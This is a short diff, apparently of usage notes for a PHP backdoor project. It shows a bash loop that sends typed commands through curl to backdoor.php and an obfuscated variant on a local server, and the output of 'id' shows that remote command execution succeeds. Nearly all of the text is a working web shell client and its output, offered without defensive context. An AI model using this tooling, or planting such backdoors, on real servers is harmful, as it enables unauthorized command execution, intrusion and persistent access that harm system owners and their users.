@@ -8,10 +8,12 @@ $ cat cli.sh
 while true;do read -p "[>] halah@wibu:~$ " cmd;curl $1$cmd;done
 
 $ bash cli.sh http://localhost:2018/backdoor.php?0=
+
 [>] halah@wibu:~$ id
 uid=10198(u0_a198) gid=10198(u0_a198) groups=10198(u0_a198),3003(inet),9997(everybody),20198(u0_a198_cache),50198(all_a198),99909997(u999_everybody)
 
 
 $ bash cli.sh http://localhost:2018/obfuse.php?0=
+
 [>] halah@wibu:~$ id
 uid=10198(u0_a198) gid=10198(u0_a198) groups=10198(u0_a198),3003(inet),9997(everybody),20198(u0_a198_cache),50198(all_a198),99909997(u999_everybody)
